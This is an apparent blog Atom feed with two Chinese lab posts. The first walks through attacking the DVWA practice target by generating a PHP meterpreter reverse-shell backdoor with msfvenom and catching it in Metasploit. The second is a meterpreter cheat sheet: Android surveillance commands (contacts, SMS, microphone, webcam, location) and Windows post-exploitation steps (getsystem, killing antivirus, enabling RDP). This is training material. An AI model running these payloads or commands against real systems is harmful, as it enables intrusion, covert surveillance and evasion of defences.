<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://MangPumo.github.io</id>
    <title></title>
    <subtitle>翩若浮云着霓裳，落幕鬓边皆染霜</subtitle>
    <icon>https://mangpumo.github.io/images/favicon.ico</icon>
    <link href="https://MangPumo.github.io" />
    <author>
      <name>Mang Pumo</name>
    </author>
    <updated>2023-01-11T20:48:56.000Z</updated>
    <entry>
        <id>https://mangpumo.github.io/2023/01/12/PHP%E5%90%8E%E9%97%A8%E5%8F%8D%E5%BC%B9%E6%BC%94%E7%A4%BA/</id>
        <title>PHP后门反弹演示</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/12/PHP%E5%90%8E%E9%97%A8%E5%8F%8D%E5%BC%B9%E6%BC%94%E7%A4%BA/"/>
        <content type="html">&lt;h1 id=&#34;一-环境准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-环境准备&#34;&gt;#&lt;/a&gt; 一、 环境准备&lt;/h1&gt;
&lt;h3 id=&#34;1-dvwa靶场&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-dvwa靶场&#34;&gt;#&lt;/a&gt; 1 DVWA 靶场&lt;/h3&gt;
&lt;p&gt;DVWA 下载：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jb2RlbG9hZC5naXRodWIuY29tL2V0aGljYWxoYWNrM3IvRFZXQS96aXAvbWFzdGVy&#34;&gt;https://codeload.github.com/ethicalhack3r/DVWA/zip/master&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;注意：配置 DVWA 环境 准备 PHP7.0 以上，和 Nginx 环境&lt;br&gt;
 1 配置数据库密码  配置 config/config.inc.php.dist 文件（注意后门的 .dist 要通过重命名删掉）&lt;br&gt;
2 使用浏览器访问 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL1h4SVAvc2V0dXAucGhw&#34;&gt;http://XxIP/setup.php&lt;/span&gt;&lt;br&gt;
3 红字问题解决&lt;br&gt;
 4 缺少 key  直接替换下面 2 句  或者 访问 https://www.google.com/recaptcha/admin/create&lt;br&gt;
&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mrow&gt;&lt;/mrow&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;V&lt;/mi&gt;&lt;mi&gt;W&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;[&lt;/mo&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;msup&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;]&lt;/mo&gt;&lt;msup&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mn&gt;6&lt;/mn&gt;&lt;mi&gt;L&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;J&lt;/mi&gt;&lt;mi&gt;J&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;U&lt;/mi&gt;&lt;mi&gt;U&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;H&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mi&gt;Q&lt;/mi&gt;&lt;mn&gt;6&lt;/mn&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;Z&lt;/mi&gt;&lt;mi&gt;R&lt;/mi&gt;&lt;mi&gt;Q&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mn&gt;8&lt;/mn&gt;&lt;mi&gt;V&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mi&gt;z&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;B&lt;/mi&gt;&lt;msup&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mo separator=&#34;true&#34;&gt;;&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;_DVWA[ &amp;#x27;recaptcha_public_key&amp;#x27; ] = &amp;#x27;6LdJJlUUAAAAAH1Q6cTpZRQ2Ah8VpyzhnffD0mBb&amp;#x27;;
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.038em;vertical-align:-0.286108em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34; style=&#34;margin-right:0.02778em;&#34;&gt;D&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.22222em;&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;W&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15139200000000003em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34;&gt;p&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.286108em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.33610799999999996em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.946332em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.09618em;&#34;&gt;J&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.09618em;&#34;&gt;J&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10903em;&#34;&gt;U&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10903em;&#34;&gt;U&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.08125em;&#34;&gt;H&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;Q&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.07153em;&#34;&gt;Z&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.00773em;&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;Q&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.22222em;&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.04398em;&#34;&gt;z&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05017em;&#34;&gt;B&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;_DVWA[ &#39;recaptcha_private_key&#39; ] = &#39;6LdJJlUUAAAAAM2a3HrgzLczqdYp4g05EqDs-W4K&#39;;&lt;br&gt;
5 allow_url_include: Disabled  提示没开启&lt;br&gt;
找到 php 目录里的 php.ini allow_url_include  将后面参数 OFF 改成 On 修改完成重启 Nginx 生效&lt;/p&gt;
&lt;h3 id=&#34;2-metasploit任意平台&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-metasploit任意平台&#34;&gt;#&lt;/a&gt; 2 Metasploit 任意平台&lt;/h3&gt;
&lt;p&gt;可以是 Windows 版，可以是 kali 自带版&lt;/p&gt;
&lt;h1 id=&#34;二-metasploit配置监控及攻击载荷&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-metasploit配置监控及攻击载荷&#34;&gt;#&lt;/a&gt; 二、Metasploit 配置监控及攻击载荷&lt;/h1&gt;
&lt;h3 id=&#34;1-配置监控-使用handler模块&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-配置监控-使用handler模块&#34;&gt;#&lt;/a&gt; 1 配置监控 - 使用 handler 模块&lt;/h3&gt;
&lt;h3 id=&#34;use-exploitmultihandler&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#use-exploitmultihandler&#34;&gt;#&lt;/a&gt; use exploit/multi/handler&lt;/h3&gt;
&lt;h3 id=&#34;img-2-配置攻击载荷设置payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#img-2-配置攻击载荷设置payload&#34;&gt;#&lt;/a&gt; &lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/a2529fe010ac46108a0413b8153c08b0.png&#34; alt=&#34;img&#34;&gt;  2 配置攻击载荷设置 payload&lt;/h3&gt;
&lt;h3 id=&#34;第一步设置payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第一步设置payload&#34;&gt;#&lt;/a&gt; 第一步设置 payload&lt;/h3&gt;
&lt;h3 id=&#34;set-payload-phpmeterpreterreverse_tcp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#set-payload-phpmeterpreterreverse_tcp&#34;&gt;#&lt;/a&gt; set payload php/meterpreter/reverse_tcp&lt;/h3&gt;
&lt;h3 id=&#34;第二步设置-lhost-和-lport&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第二步设置-lhost-和-lport&#34;&gt;#&lt;/a&gt; 第二步设置 lhost 和 lport&lt;/h3&gt;
&lt;h3 id=&#34;set-lhost-xxxip&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#set-lhost-xxxip&#34;&gt;#&lt;/a&gt; set lhost xxxip ；&lt;/h3&gt;
&lt;h3 id=&#34;set-lport-xxx端口&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#set-lport-xxx端口&#34;&gt;#&lt;/a&gt; set lport  xxx 端口；&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/ad204b7bb1bc4c709f4d6948d4ef219a.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;3-生成php后门执行攻击获得meterpreter&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-生成php后门执行攻击获得meterpreter&#34;&gt;#&lt;/a&gt; 3 生成 php 后门执行攻击获得 meterpreter&lt;/h3&gt;
&lt;p&gt;新建一个终端在终端内输入&lt;/p&gt;
&lt;p&gt;msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.3.23 lport=4456 R&amp;gt;shell.php&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/1fa4967afb3f487f84926004d4ddc591.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;3.2 传播 - 使用 Python 简单的 web 服务&lt;/p&gt;
&lt;p&gt;python -m SimpleHTTPServer 80&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/6604546c76d7471e9f332e81daf6c570.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;将 shell.php&lt;/p&gt;
&lt;p&gt;3.3 执行攻击获得 meterpreter&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/1003035b32a343488a282bddec48a62b.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;run 或者 exploit&lt;/p&gt;
&lt;p&gt;获取到 meterpreter 我们就可以做渗透操作了&lt;/p&gt;
&lt;p&gt;比如 观看屏幕 可以在 meterpreter 里输入&lt;/p&gt;
&lt;p&gt;run vnc&lt;/p&gt;
&lt;p&gt;查看当前账号可以在 meterpreter 里输入&lt;/p&gt;
&lt;p&gt;getuid&lt;/p&gt;
</content>
        <updated>2023-01-11T20:48:56.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/12/meterpreter/</id>
        <title>meterpreter</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/12/meterpreter/"/>
        <content type="html">&lt;h1 id=&#34;一-meterpreter是什么&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-meterpreter是什么&#34;&gt;#&lt;/a&gt; 一、 Meterpreter 是什么&lt;/h1&gt;
&lt;p&gt;Meterpreter 是 Metasploit 框架中的一个利器，作为漏洞溢出后的攻击载荷使用，攻击载荷在触发漏洞后会返回一个由我们控制的通道，可用于远程执行命令！&lt;br&gt;
Metasploit 提供了各个主流平台的 Meterpreter 版本，包括 Windows、Linux，同时支持 x86、x64 平台，另外，Meterpreter 还提供了基于 PHP 和 Java 语言的实现。Meterpreter 的工作模式是纯内存的，好处是启动隐藏，很难被杀毒软件监测到。不需要访问目标主机磁盘，所以也没什么入侵的痕迹。除上述外，Meterpreter 还支持 Ruby 脚本形式的扩展。所以 Ruby 语言还很有必要了解下。&lt;/p&gt;
&lt;h1 id=&#34;二-meterpreter中常用的反弹类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-meterpreter中常用的反弹类型&#34;&gt;#&lt;/a&gt; 二、Meterpreter 中常用的反弹类型&lt;/h1&gt;
&lt;p&gt;1.reverse_tcp&lt;br&gt;
 这是一个基于 TCP 的反向链接反弹 shell, 使用起来很稳定&lt;/p&gt;
&lt;h1 id=&#34;三-meterpreter的常用命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三-meterpreter的常用命令&#34;&gt;#&lt;/a&gt; 三、Meterpreter 的常用命令&lt;/h1&gt;
&lt;h2 id=&#34;1基本命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1基本命令&#34;&gt;#&lt;/a&gt; 1. 基本命令&lt;/h2&gt;
&lt;p&gt;help# 查看 Meterpreter 帮助&lt;/p&gt;
&lt;p&gt;background# 返回，把 meterpreter 后台挂起&lt;br&gt;
 bgkill# 杀死一个 meterpreter 脚本&lt;br&gt;
 bglist# 提供所有正在运行的后台脚本的列表&lt;br&gt;
 bgrun# 作为一个后台线程运行脚本&lt;br&gt;
 channel# 显示活动频道&lt;br&gt;
 sessions -i number # 与会话进行交互，number 表示第 n 个 session, 使用 session -i 连接到指定序号的 meterpreter 会话已继续利用&lt;br&gt;
 sesssions -k  number #与会话进行交互&lt;br&gt;
 close# 关闭通道&lt;br&gt;
 exit# 终止 meterpreter 会话&lt;br&gt;
 quit# 终止 meterpreter 会话&lt;br&gt;
 interact id #切换进一个信道&lt;br&gt;
 run# 执行一个已有的模块，这里要说的是输入 run 后按两下 tab，会列出所有的已有的脚本，常用的有 autoroute,hashdump,arp_scanner,multi_meter_inject 等&lt;br&gt;
 irb# 进入 Ruby 脚本模式&lt;br&gt;
 read# 从通道读取数据 write# 将数据写入到一个通道&lt;br&gt;
 run 和 bgrun# 前台和后台执行以后它选定的 meterpreter 脚本&lt;br&gt;
 use# 加载 meterpreter 的扩展&lt;br&gt;
 load/use# 加载模块&lt;br&gt;
 Resource# 执行一个已有的 rc 脚本&lt;/p&gt;
&lt;h2 id=&#34;2-常用命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-常用命令&#34;&gt;#&lt;/a&gt; 2  常用命令&lt;/h2&gt;
&lt;h3 id=&#34;21-针对安卓手机的一些命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#21-针对安卓手机的一些命令&#34;&gt;#&lt;/a&gt; 2.1 针对安卓手机的一些命令&lt;/h3&gt;
&lt;p&gt;获取手机通讯录： dump_contacts&lt;/p&gt;
&lt;p&gt;获取短信记录：dump_sms&lt;/p&gt;
&lt;p&gt;控制实验手机发短信：send_sms -d 15330252525 -t&lt;br&gt;
&amp;quot;hello&amp;quot;&lt;/p&gt;
&lt;p&gt;获取实验手机 GPS 定位信息：geolocate&lt;/p&gt;
&lt;p&gt;获取实验手机 Wi-Fi 定位信息：wlan_geolocate&lt;/p&gt;
&lt;p&gt;控制实验手机录音：record_mic&lt;br&gt;
-d  5&lt;/p&gt;
&lt;p&gt;获取实验手机相机设备：webcam_list&lt;/p&gt;
&lt;p&gt;控制实验手机拍照 ：webcam_snap&lt;/p&gt;
&lt;p&gt;直播实验手机摄像头：webcam_stream&lt;/p&gt;
&lt;h3 id=&#34;22-针对windows的一些命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#22-针对windows的一些命令&#34;&gt;#&lt;/a&gt; 2.2 针对 Windows 的一些命令&lt;/h3&gt;
&lt;p&gt;查看进程：ps&lt;/p&gt;
&lt;p&gt;查看当前进程号：getpid&lt;/p&gt;
&lt;p&gt;查看系统信息：sysinfo&lt;/p&gt;
&lt;p&gt;查看目标机是否为虚拟机：run&lt;br&gt;
post/windows/gather/checkvm&lt;/p&gt;
&lt;p&gt;查看完整网络设置：route&lt;/p&gt;
&lt;p&gt;查看当前权限：getuid&lt;/p&gt;
&lt;p&gt;自动提权：getsystem&lt;/p&gt;
&lt;p&gt;关闭杀毒软件：run post/windows/manage/killav&lt;/p&gt;
&lt;p&gt;启动远程桌面协议：run post/windows/manage/enable_rdp&lt;/p&gt;
&lt;p&gt;列举当前登录的用户：run post/windows/gather/enum_logged_on_users&lt;/p&gt;
&lt;p&gt;查看当前应用程序：run post/windows/gather/enum_applications&lt;/p&gt;
&lt;p&gt;抓取目标机的屏幕截图：load espia ； screengrab&lt;/p&gt;
&lt;p&gt;获取相机设备：webcam_list&lt;/p&gt;
&lt;p&gt;控制拍照 ：webcam_snap&lt;/p&gt;
&lt;p&gt;直播摄像头：webcam_stream&lt;/p&gt;
